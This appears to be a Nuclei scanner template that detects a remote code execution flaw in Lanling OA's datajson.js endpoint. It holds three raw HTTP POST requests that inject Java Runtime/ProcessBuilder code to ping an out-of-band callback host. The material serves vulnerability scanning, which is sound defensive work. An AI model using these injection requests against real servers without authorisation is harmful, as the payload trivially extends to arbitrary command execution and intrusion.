id: lanling-oa-rce
info:
  name: Lanling OA datajson.js Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Lanling OA office system is an OFFICE OA tool used for instant office communication. Lanling OA has a remote code execution vulnerability. Successful exploitation of this vulnerability can cause a program to crash or even arbitrary code execution.
  tags: rce

http:
  - raw:
      - |
        POST /data/sys-common/datajson.js HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "macOS"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: SESSION=YjA5MWNkNzUtODU0ZC00NDY0LWJhODItN2JiMzM3Nzg2MTkw; Hm_lvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099; Hm_lpvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 105

        s_bean=sysFormulaSimulateByJS&script=new java.lang.ProcessBuilder("ping","{{interactsh-url}}").start()&type=1
      - |
        POST /data/sys-common/datajson.js HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "macOS"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: SESSION=YjA5MWNkNzUtODU0ZC00NDY0LWJhODItN2JiMzM3Nzg2MTkw; Hm_lvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099; Hm_lpvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 105

        s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("ping%20-c%204%20{{interactsh-url}}")&type=1
      - |
        POST /data/sys-common/datajson.js HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "macOS"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: SESSION=YjA5MWNkNzUtODU0ZC00NDY0LWJhODItN2JiMzM3Nzg2MTkw; Hm_lvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099; Hm_lpvt_4d829b71a81ae4cea109b50ec0d9b4f3=1646928099
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 105

        s_bean=sysFormulaSimulateByJS&script=var+calc='ping+{{interactsh-url}}';java.lang.Runtime.getRuntime().exec(calc)&type=1
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: interactsh_protocol
        words:
          - "http"
